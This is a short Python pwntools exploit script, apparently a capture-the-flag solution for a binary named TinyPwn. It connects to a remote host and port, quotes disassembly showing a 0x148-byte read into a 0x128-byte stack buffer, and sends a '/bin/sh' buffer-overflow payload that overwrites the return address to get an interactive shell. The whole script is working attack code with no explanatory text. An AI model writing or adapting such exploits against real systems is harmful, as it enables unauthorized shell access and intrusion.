from pwn import *
import sys

if len(sys.argv) == 1:
    p = process(["./TinyPwn"])

else:
    p = remote("159.65.125.233", "6009")

context.binary = "./TinyPwn"

'''
   0x4000f0:	syscall
   0x4000f2:	sub    rsp,0x128
   0x4000f9:	mov    rsi,rsp
   0x4000fc:	mov    edx,0x148
   0x400101:	syscall
=> 0x400103:	add    rsp,0x128
   0x40010a:	ret
'''

ret = 0x40010a
rego = 0x4000f0

exp = "/bin/sh\x00" + "A" * 0x120
exp += p64(0x4000ed)
exp += "A" * (322 - 304)
p.send(exp)

p.interactive()
